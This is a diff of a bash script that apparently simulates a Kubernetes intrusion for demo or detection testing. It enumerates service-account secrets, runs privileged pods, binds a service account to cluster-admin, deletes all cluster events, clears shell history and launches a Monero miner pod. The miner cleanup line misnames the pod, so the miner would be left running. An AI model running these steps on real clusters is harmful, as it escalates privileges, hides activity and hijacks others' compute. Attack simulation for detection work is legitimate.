@@ -1,11 +1,11 @@
 #!/bin/bash
 
+#find out what user is running
 whoami
 
 #find out if in kubernetes
 #k8s environment variables
 env | grep -i kube
-env
 
 # SA token
 ls -la /var/run/secrets/kubernetes.io/serviceaccount
@@ -39,38 +39,31 @@ done
 /tmp/kubectl get configmaps -A
 
 # create new pod
-/tmp/kubectl run demo-for-m-nginx --image=nginx --generator=run-pod/v1
-
+/tmp/kubectl run scenario-demo-nginx --image=nginx --generator=run-pod/v1
 # exec into pod 
 sleep 15  # wait for pod to initiate before exec
-/tmp/kubectl exec demo-for-m-nginx sleep 1
-
+/tmp/kubectl exec scenario-demo-nginx sleep 1
 # kill pod nginx
-/tmp/kubectl delete po demo-for-m-nginx
+/tmp/kubectl delete po scenario-demo-nginx
 
 # cronjob
 /tmp/kubectl create -f ./cronjob.json
- 
 # delete cronjob
 /tmp/kubectl delete -f ./cronjob.json
 
-# local cron?
-
 # run privileged pod
 /tmp/kubectl create -f ./privileged_pod.yaml
-
 # remove privileged pod
 /tmp/kubectl delete -f ./privileged_pod.yaml
 
 # create ServiceAccount
-/tmp/kubectl create serviceaccount demo-for-m-tester-sa
+/tmp/kubectl create serviceaccount scenario-demo-tester-sa
 
 # bind tester-sa ServiceAccount to cluster-admin
 /tmp/kubectl create -f ./clusterbind.json
 
 # run pod with high permissions SA tester-sa
 /tmp/kubectl create -f ./pod_priv_sa.yaml
-
 # delete pod with high permissions SA tester-sa
 /tmp/kubectl delete -f ./pod_priv_sa.yaml
 
@@ -78,10 +71,16 @@ sleep 15  # wait for pod to initiate before exec
 /tmp/kubectl delete -f ./clusterbind.json
 
 # delete ServiceAccount
-/tmp/kubectl delete serviceaccount tester-sa-demo
+/tmp/kubectl delete serviceaccount scenario-demo-tester-sa
 
 # deletion of Kubernetes Events
 /tmp/kubectl delete events --all
+
+# run miner pod
+/tmp/kubectl run scenario-demo-miner --image=kannix/monero-miner --generator=run-pod/v1 
+sleep 15
+# kill miner pod
+/tmp/kubectl delete po scenario-demo-mine
 
 # clear command history
 history -c
